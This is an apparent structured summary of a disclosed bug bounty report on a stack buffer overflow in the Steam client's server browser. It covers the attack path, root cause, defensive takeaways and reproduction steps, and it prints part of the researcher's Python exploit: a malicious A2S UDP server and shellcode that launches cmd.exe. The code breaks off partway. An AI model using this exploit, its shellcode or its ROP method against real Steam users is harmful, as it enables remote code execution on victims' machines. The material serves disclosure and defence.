# RCE on Steam Client via Buffer Overflow in Server Info (A2S_PLAYER Response)

## Metadata
- **Source:** HackerOne
- **Report:** 470520 | https://hackerone.com/reports/470520
- **Submitted:** 2018-12-21
- **Reporter:** vinnievan
- **Program:** Steam
- **Bounty:** Not specified in writeup
- **Severity:** critical
- **Vuln:** stack-based buffer overflow, improper input validation, unsafe unicode conversion, missing bounds checking
- **CVEs:** None
- **Category:** memory-binary

## Summary
A stack-based buffer overflow exists in Steam's server browser functionality when processing A2S_PLAYER UDP server query responses with oversized player names. The vulnerability occurs during unicode conversion in the serverbrowser library without bounds checking, allowing remote code execution via a malicious game server.

## Attack scenario
1. Attacker sets up a malicious UDP server implementing the Valve A2S server query protocol
2. Attacker crafts A2S_PLAYER response with an exceptionally long unicode player name (e.g., u'\u4141'*1100)
3. Victim opens Steam client and browses game servers, connecting to attacker's malicious server
4. Steam client receives the oversized player name and converts it to unicode without boundary checks, causing stack buffer overflow
5. Attacker's overflow payload overwrites stack memory and return address with ROP gadget chain from Steam.exe
6. ROP chain calls VirtualProtect to make stack executable, then jumps to unicode shellcode executing arbitrary commands (e.g., cmd.exe)

## Root cause
The serverbrowser library performs unicode conversion on player names from server query responses without validating buffer boundaries. The conversion function assumes sufficient stack space and lacks canary protection on Windows, enabling return address overwrite and code execution.

## Attacker mindset
An attacker would distribute a malicious game server to maximize exposure. With ASLR providing only 9 bits of randomization (512 possibilities), the attacker could achieve ~0.2% success rate per attempt, gaining shell access on victim machines through repeated attempts at scale or by combining with a memory leak vulnerability for 100% reliability.

## Defensive takeaways
- Implement strict input validation and bounds checking for all network-received data, especially player names with variable encoding
- Use fixed-size buffers with explicit length limits or dynamically allocated buffers with proper size tracking
- Enable stack canaries/stack cookies on all platforms to detect return address overwrites
- Implement Control Flow Guard (CFG) or similar return-oriented programming (ROP) mitigations on Windows
- Apply Address Space Layout Randomization (ASLR) with sufficient entropy (>16 bits) to increase exploitation difficulty
- Sanitize and validate all fields from untrusted UDP protocol responses before processing
- Use safe string handling libraries that enforce bounds checking
- Consider using safer languages or memory-safe libraries for network protocol parsing

## Variant hunting
Search for similar buffer overflow vulnerabilities in other Valve game server query implementations (CSGO, TF2, Half-Life)
Audit other fields in A2S protocol responses (server name, map name, game description) for similar unicode conversion issues
Check for similar vulnerabilities in other network protocol handlers that accept player-controlled strings
Test other game engines' server browser implementations for equivalent buffer overflow bugs
Examine legacy protocol implementations that may not have received security updates

## MITRE ATT&CK
- T1190
- T1068
- T1055
- T1053
- T1059

## Notes
The exploit demonstrates sophisticated ROP chain construction to bypass modern mitigations. The 9-bit ASLR weakness is particularly concerning for a large-scale attack surface. Windows 8.1 and 10 are vulnerable; OSX appears protected by canaries. The requirement to predict or leak Steam.exe base address is the primary exploitation hurdle. Attack can be triggered via server browser UI interaction or programmatically via custom Steam URL scheme, making accidental triggering possible.

## Full report
<details><summary>Expand</summary>

## Introduction

In Steam and other valve games (CSGO, Half-Life, TF2) there is a functionality to find game servers called the server browser. In order to retrieve the information about these servers the server browser communicates with a specific UDP protocol called [server queries](https://developer.valvesoftware.com/wiki/Server_queries). The protocol is well described in the online developers manual of Steam. We implemented a custom python server which only replies with the protocol using the same information available in the documentation. After a successful implementation of the protocol we fuzzed several parameters and noticed that the Steam client crashed when receiving replies from our custom server. More specifically, the client crashed when we replied with a large player name used in the `A2S_PLAYER` response. When attaching a debugger we noticed it crashed due to a stack-based buffer overflow.

This clearly indicates that something was wrong and we investigated it further to be able to exploit the buffer overflow. After further inspection, we noticed that the overflow occurred in the `serverbrowser` library. At some point the players’ name is converted into unicode and an overflow occurs because the boundaries are not checked. Also, there’s no canary protection present, which allowed us to overwrite the return address and execute arbitrary code on Windows.

## Exploit details

We wanted to prove impact and build an exploit. First, we tested it on Linux and we were able to control the execution flow instantly by overwriting the return address. However, on Linux, we were able to control two bytes of the `EIP` register only (e.g. `0x00004141`) and we didn’t explore it further. On OSX, the process terminated with `SIGABRT`, which means that there’s probably a canary protection in the library on OSX. Then, we tried to exploit it on Windows and we were successful (tested on Windows 8.1 and 10).

On Windows, sending a player name via UDP like `A*1100` would result in the following stack layout:
```
0x00410041
0x00410041
...
```

This happens due to unicode conversion (wide-char), because player names can use unicode characters. Sending a player name with unicode characters like `u"\u4141"*1100` would result in the following layout:
```
0x41414141
0x41414141
...
```

However, since we were corrupting the stack and registers before the function returns, we had no control over the `EIP` register yet. The program was crashing after dereferencing the `edi` register, but we had control over it. We satisfied these special conditions using constant values present on the `Steam.exe` binary:

{F395516}

Then, we built a unicode ROP chain with gadgets from `Steam.exe` only, to call `VirtualProtect` dynamically to make the stack executable and jump to our unicode shellcode to execute `cmd.exe`. This was a big challenge since we couldn't use values like `0x00000040` in our ROP chain, otherwise the string would be terminated. And we couldn't use invalid unicode characters like `u"\uda01"` because the library replaces them with a question mark `?` - `0x003F`.

**Note:** Everything is calculated using the `Steam.exe` base address. This address changes if you restart your Windows 8 or Windows 10, not if you relaunch Steam. The exploit is 100% reliable if you edit the base address on the exploit, but you can't predict the base address in the computer of a victim due to ASLR. However, we have two exploitation scenarios:

- Only 9 bits are randomized: An attacker can successfully exploit a victim with a probability of 0.2% (1/512), which is more than enough if we are talking about an attacker distributing this exploit massively to all Steam users (1 new victim every 512 attempts in average)
- This vulnerability can be chained with another memory leak vulnerability to make it 100% reliable

## Steps to reproduce

First, make sure that you have Steam installed. If you are using the beta version, please uncomment the beta version gadgets in the exploit code.

1 - Download the attachment: {F395515}
2 - Use a debugger like Immunity Debugger and attach to Steam.exe
3 - Grab the base address of `Steam.exe` (View > Executable modules) and edit the `STEAM_BASE` variable on `steam_serverinfo_exploit.py` to make the exploit 100% reliable
{F395520}

4 - Run the exploit on a server of your choice (e.g. localhost): `python steam_serverinfo_exploit.py`
5 - Edit `POC.html` and change the IP address of the server in the `iframe src`
6 - Open it in a browser and wait for `cmd.exe` to be executed
7 - You can also open the server browser in the menu (View > Servers) and click `View server info` to trigger the exploit (if you are running the server in the same network it will appear in the LAN section)

## PoC

{F395517}
**Steamclient_POC_Windows10.mp4**: Contains a video of the exploit being triggered on Windows 10 via manual interaction with the Steam server browser

{F395518}
**SteamURL_POC_Windows10.mp4**: Contains a video of the exploit being triggered on Windows 10 via a malicious web page containing a hidden iframe that will trigger the exploit automatically. In the video, Steam was not running when visiting the malicious page and it was automatically started. This also works when Steam is already running.

{F395519}
Contains the html page code used in the SteamURL video.

**Exploit code:**

```python
import logging
import socket
import textwrap


### Exploit for Server Info - Player Name buffer overflow (Steam.exe - Windows 8 and 10) #######
# More info: https://developer.valvesoftware.com/wiki/Server_queries
# Shellcode must contain valid unicode characters, pad with NOPs :)


STEAM_BASE = 0x01180000

# Shellcode: open cmd.exe
shellcode = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x90\x8b\x52\x78\x01\xda\x8b\x72\x20\x90\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x90\x01\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x90\x01\xda\x31\xf6\x89\xd6\x31\xff\x89\xdf\x31\xc9\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\x0c\x31\xc9\x68\x65\x73\x73\x42\x88\x4c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x54\x57\x31\xff\x89\xc7\xff\xd6\x83\xc4\x0c\x31\xc9\x51\x68\x64\x6c\x6c\x41\x88\x4c\x24\x03\x68\x6c\x33\x32\x2e\x68\x73\x68\x65\x6c\x54\x31\xd2\x89\xfa\x89\xc7\xff\xd2\x83\xc4\x0b\x31\xc9\x68\x41\x42\x42\x42\x88\x4c\x24\x01\x68\x63\x75\x74\x65\x68\x6c\x45\x78\x65\x68\x53\x68\x65\x6c\x54\x50\xff\xd6\x83\xc4\x0d\x31\xc9\x68\x65\x78\x65\x41\x88\x4c\x24\x03\x68\x63\x6d\x64\x2e\x54\x59\x31\xd2\x42\x52\x31\xd2\x52\x52\x51\x52\x52\xff\xd0\xff\xd7"


def udp_server(host="0.0.0.0", port=27015):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print("[*] Starting TSQuery UDP server on host: %s and port: %s" % (host, port))
    s.bind((host, port))
    while True:
        (data, addr) = s.recvfrom(128*1024)
        requestType = checkRequestType(data)
        if requestType == "INFO":
            response = createINFOReply()
        elif requestType == "PLAYER":
            response = createPLAYERReply()
            print("[+] Payload sent!")
        else:
            response = 'nope'
        s.sendto(response,addr)
        yield data


def checkRequestType(data):
    # Header byte contains the type of request
    header = data[4]
    if header == "\x54":
        print("[*] Received A2S_INFO request")
        return "INFO"
    elif header == "\x55":
        print("[*] Received A2S_PLAYER request")
        return "PLAYER"
    else:
        print "Unknown request"
        return "UNKNOWN"


def createINFOReply():
    # A2S_INFO response
    # Retrieves information about the server including, but not limited to: its name, the map currently being played, and the number of players.
    pre = "\xFF\xFF\xFF\xFF"            

</details>

---
*Analysed by Claude on 2026-05-11*
